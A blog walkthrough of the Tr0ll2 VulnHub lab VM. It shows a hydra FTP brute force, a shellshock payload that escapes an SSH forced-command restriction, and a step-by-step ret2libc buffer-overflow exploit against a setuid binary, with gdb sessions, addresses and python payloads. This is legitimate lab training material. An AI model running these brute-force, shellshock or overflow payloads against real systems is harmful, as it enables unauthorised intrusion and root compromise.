---
categories:
- CTF
- Vulnerable VM
- Solution
- Challenge
- VulnHub
comments: true
date: 2014-10-10T17:32:35Z
title: another troll tamed - solving troll 2
---

## foreword

[Tr0ll2](https://www.vulnhub.com/entry/tr0ll-2,107/) is a successor in a boot2root series by [@Maleus21](https://twitter.com/Maleus21) hosted over at [VulnHub](http://vulnhub.com/). Having been able to [pwn Tr0ll1](https://leonjza.github.io/blog/2014/08/15/taming-the-troll/), I gave this one a shot too.

Here is my experience taming the troll, again.

<!--more-->

## getting started
Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a `nmap` against it:

```bash
root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-10 06:55 SAST
Nmap scan report for 192.168.56.101
Host is up, received reset (0.00031s latency).
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
```

ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for _vsftpd 2.0.8 exploit_ with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren't any strange banners etc to be found which was not the case.

## web server
Opening up a browser to http://192.168.56.101 revealed a familiar image:

{{< figure src="/images/troll2_web.png" >}}
Oh. Hai. The sources serving up the image had the comment `<!-- Nothing to see here, but good try NOOB!>` with the image.

Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:

```bash
/keep_trying
/dont_bother
/noob
/ok_this_is_it
```

The content served up at these URLs:

{{< figure src="/images/troll2_noob.png" >}}

The source that serves up this image had the comment `<!--What did you really think to find here? Try Harder!>` with the image.

So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL's that would 200 into a text file from the `robots.txt` and looped over them downloading the images:

```bash
root@kali:~# for line in $(cat 200.txt); do echo "==>$line<==" && wget 192.168.56.101/$line/cat_the_troll.jpg; done

==>/ok_this_is_it<==
--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15831 (15K) [image/jpeg]
Saving to: `cat_the_troll.jpg.3'

100%[=======>] 15,831      --.-K/s   in 0s

2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3' saved [15831/15831]
```

Immediately when you `ls` the directory containing the images will you notice a difference:

```bash
root@kali:~# ls -l
total 68
-rw-r--r-- 1 root root    47 Oct 10 07:31 200.txt
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg
-rw-r--r-- 1 root root 15873 Oct  4 10:31 cat_the_troll.jpg.1 #<---
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.2
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.3
```

One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a `cmp` on the files hinted towards what may be up.

```bash
root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
cmp: EOF on cat_the_troll.jpg
```

Sweet, so lets print the last line of both and check what the diff is:

```bash
root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg
8�z2��p�T�lj\p��?�<�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_�

root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
8�z2��p�T�lj\p��?�<�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_��Look Deep within y0ur_self for the answer
```

_Look Deep within y0ur_self for the answer_. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words _y0ur_self_ were written differently, I tried to use this as a web path:

{{< figure src="/images/troll2_y0ur_self.png" >}}

I downloaded `answer.txt` and started to check what is happening inside:

```bash
root@kali:~# head answer.txt
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
```

Looks a lot like base64 hey? Lets try decode it:

```bash
root@kali:~# cat answer.txt | base64 -d | head
A
A
AA
AB
ABM
AC
ACTH
AI
AIDS
AM
```

The resultant output appeared to be a wordlist. A big one too. In fact, it has **99157** entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a `sort | uniq`, the size was reduced to **73128** which was still too much.

I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry **ItCantReallyBeThisEasyRightLOL** on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P

My guess was that this has to be a password for either the FTP or SSH service.

## ftpee
I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.

As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in `answer.txt`, mutate it a bit and hand it over to hydra to do its work.

My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran `cat wordz |  tr "\"' " '\n' | sort -u >> words` to break it up into a wordlist. Lastly I took the entries had a `_` in them and broke them up as single words ie: `cat_the_troll.jpg` turned into `cat`, `the`, `troll`. The resultant list can be seen [here](https://gist.github.com/leonjza/db5cc19cd62b270a89db)

And finally, it was time to let hydra on the loose.

```
root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-10 08:11:50
[DATA] 30 tasks, 1 server, 13689 login tries (l:117/p:117), ~456 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login ">" - pass ">" - 1 of 13689 [child 0]
[ATTEMPT] target 192.168.56.101 - login ">" - pass "404" - 2 of 13689 [child 1]
[ATTEMPT] target 192.168.56.101 - login ">" - pass "again" - 3 of 13689 [child 2]
[ATTEMPT] target 192.168.56.101 - login ">" - pass "agent" - 4 of 13689 [child 3]
[...]
[ATTEMPT] target 192.168.56.101 - login "Tr0ll" - pass "Tr0ll" - 10621 of 13689 [child 4]
[ATTEMPT] target 192.168.56.101 - login "Tr0ll" - pass "tr0ll2" - 10622 of 13689 [child 8]
[ATTEMPT] target 192.168.56.101 - login "Tr0ll" - pass "tr0ll_again.jpg" - 10623 of 13689 [child 23]
[21][ftp] host: 192.168.56.101   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-10 08:29:08
```

After a really, really long time, we finally get a successful combination of `Tr0ll:Tr0ll`. Guess I could have guessed that but oh well. Lets see if this gives us any access:

```bash
root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.56.101:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
```

Yay! Progress! Lets take a closer look...

```bash
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pas
Passive mode on.

ftp> ls
227 Entering Passive Mode (192,168,56,101,73,4)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
226 Directory send OK.

ftp> get lmao.zip
local: lmao.zip remote: lmao.zip
227 Entering Passive Mode (192,168,56,101,105,73)
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (621.0 kB/s)

ftp> bye
221 Goodbye.
```

## noob key
We find ourselves with a zip archive called `lmao.zip`. A encrypted one :(

I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of `answer.txt`:

```bash
root@kali:~/Desktop/troll2# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: #ItCantReallyBeThisEasyRightLOL
  inflating: noob

root@kali:~# cat noob
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
```

A unencrypted private key! Called `noob`. I guessed `noob` may be the username, so I fixed up the permissions on the key and tried my luck:

```bash
root@kali:~/Desktop/troll2# chmod 600 noob
root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
```

## shocking isn't it
Surprise surprise. It seemed like we are in fact authenticating, but we don't have a shell. I figured one of two things could be happening here. First, the `.bashrc` may have been modified with something that echoes the text `TRY HARDER LOL!` and exits, or there is some restriction on the SSH key for `noob`.

My first attempts were to specify a command with `-t` as `/bin/bash`, but this did not work.

With the current buzz around the recently disclosed _shellshock_ bug, I thought I'd try it assuming its a key restriction:

```bash
root@kali:~# ssh noob@192.168.56.101 -i noob -t '() { :;}; /bin/bash'
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

Shocking :) To confirm, the `authorized_keys` file has the entry `command="echo TRY HARDER LOL!" ` before the public key.

## which door leads to r00t
With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory `/nothing_to_see_here`.

`/nothing_to_see_here` had another directory inside of it `choose_wisely/` with another 3 sub directories called `door1`, `door2` and `door3`.

All 3 'doors' had a setuid binary called `r00t`. I ran the first one which had the output:

```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
Broadcast message from noob@Tr0ll2
    (/dev/pts/0) at 0:48 ...

The system is going down for reboot NOW!
Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
```

Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D

The machine rebooted and I logged in again as `noob`, changing directories to the `r00t` binaries. I tried to run `strings` on them, but it seems like the command was unavailable. No worries, next on the list was `od`.

```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t
[...]
0001214 __libc_start_main
0001236 GLIBC_2.0
0001320 R
0001453 Q
0001521 %
0001526 h
0001626 h
0001646 h(
0002066 t&
0002073 '
0002305 i
0002620 Good job, stand by, executing root shell...
0002674 BUHAHAHA NOOB!
0002713 /sbin/reboot
0002733 ;0
0002750 L
0002760 p
0003025 zR
0003044
0003060 p
0003077 x
[...]
```

So this is the binary that simply rebooted the machine. What is weird though is that this `r00t` binary was in `door1/` prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the `r00t` binaries were shuffled around again.

This was only a minor annoyance and I had enough time to check out the binaries using `od` to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.

## bof bof bof your boat...
I copied the binary of interest to `/tmp` so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.

With the binary in `/tmp`, `noob` was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.

To check the security applied to the binary at compile time, I copied it off using `xxd` to my local machine and checked it out.

```bash
root@kali:~# gdb -q ./r00t
Reading symbols from /root/Desktop/troll2/r00t...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partia
```

No security? EZ PEZE.

Next, it was time to start fuzzing the binary and see if it has any interesting behavior:

```bash
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" * 500')
Segmentation fault
```

500 "A"'s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.

```bash
noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 =>  (0xb7fff000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
    /lib/ld-linux.so.2 (0x80000000)

noob@Tr0ll2:/tmp$ ldd ./r00t
    linux-gate.so.1 =>  (0xb7fff000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
    /lib/ld-linux.so.2 (0x80000000)
```

Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include `gdb`, making the exploit development process very easy.

## the exploit
With all of the information gathered so far about this particularly interesting `r00t` binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.

First, we have to inspect the crash when we send those 500 A's

```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r $(python -c 'print "A" * 500')
Starting program: /tmp/r00t $(python -c 'print "A" * 500')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) x/x $eip
0x41414141: Cannot access memory at address 0x41414141
```

We see that we have cleanly overwritten EIP with our hex representation of A's. We don't know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit `pattern_create` script, and then checking the offset using the `pattern_offset` script.

Lets generate the pattern.

```bash
root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb

root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

Next, we provide this pattern as input to crash the application and inspect the registers:

```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

Starting program: /tmp/r00t "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
```

So we crashed at `0x6a413969`. Lets check the offset of this in our buffer.

```bash
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
[*] Exact match at offset 268
```

So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B's:

```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) r $(python -c 'print "A" *268 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/r00t $(python -c 'print "A" *268 + "BBBB"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

(gdb) x/x $eip
0x42424242: Cannot access memory at address 0x42424242
(gdb)
```

So with that done, we can deduce that we can cleanly override EIP at offset 268.

The next part we need to get is the location of `system()` from within libc. We can leak this address quite easily by inspecting the memory from a running application such as `r00t` linked to it:

```bash
noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

(gdb) b *main   # here we break on the main function
Breakpoint 1 at 0x8048444: file bof.c, line 3.

(gdb) r         # here we run the application....
Starting program: /tmp/r00t

Breakpoint 1, main (argc=1, argv=0xbffffd84) at bof.c:3
3   bof.c: No such file or directory.

(gdb) p system  # and leak the locatin of system() in memory
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

So `system()` lives at `0xb7e6b060`. We are going to point EIP here and provide it a argument from a environment variable. I don't really care if the application exits cleanly, however you can easily get that right by leaking the location of `exit()` too and placing that as the ret address in the exploit. I just like to type JUNK ;)

So far our exploit payload will look something like this:

```text
A * 268 + system() + JUNK
```

The last thing we need is a argument for `system()` on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as `/bin/sh`. We can easily set an environment variable with this string, locate it in memory and use that.

So lets create this string, which we will refer to as the EGG.

```bash
noob@Tr0ll2:/tmp$ export EGG=/bin/sh
noob@Tr0ll2:/tmp$ env | grep EGG
EGG=/bin/sh
```

Next, we can use a small C program to tell us where this EGG is in memory:

```bash
noob@Tr0ll2:/tmp$ cat /tmp/findegg.c
#include <unistd.h>

int main(void)
{
  printf("EGG address: 0x%lx\n", getenv("EGG")+4);
  return 0;
}

noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
[...]

noob@Tr0ll2:/tmp$ /tmp/findegg
EGG address: 0xbfffff04
```

So our egg lives at `0xbfffff04`. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of `gdb`.

With everything we need, we can deduce that our exploit payload will end up being something like this:

```text
A * 268 + system() + JUNK + EGG
```

Lets get the python version of that written up and sent to our vulnerable binary (addresses are written 'backwards' due to the little endian format of the CPU):

```bash
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x04\xff\xff\xbf"')
Segmentation fault
```

Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called `r00t`, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:

```bash
# so just to recap, we check for the location of the EGG
noob@Tr0ll2:/tmp$ ./findegg
EGG address: 0xbfffff04

# EGG is at 0xbfffff04, so in little endian format we have:
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x04\xff\xff\xbf"')
Segmentation fault

# A segfault, lets move it up 1 byte
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x05\xff\xff\xbf"')
sh: 1: =/bin/sh: not found
Segmentation fault

# another segfault, however we have a little diagnostics message now
# showing that we are not far off :)
noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x06\xff\xff\xbf"')
$
```

## trollin the rootin
So `0xbfffff06` as a EGG location will give us shell in our testing! To finish off then, I have to find the correct `r00t` binary in all of the `door{1,2,3}` folders and attempt my exploit there:

```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x06\xff\xff\xbf"')
sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
Segmentation fault
```

Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the `PWD` changing so drastically. To fix this, we simply rerun our `findegg` program and compensate for the binary name. When completing this, I had a successful run as follows:

```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\xe2\xfe\xff\xbf"')
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
```

This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from `0xbffffeda` all the way to `0xbffffee2`

As I was now root, I may cat the `Proof.txt` in `/root`

```bash
# cat /root/Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

Thanks [@Maleus21](https://twitter.com/Maleus21) for the fun VM and [VulnHub](http://vulnhub.com/) for the hosting :)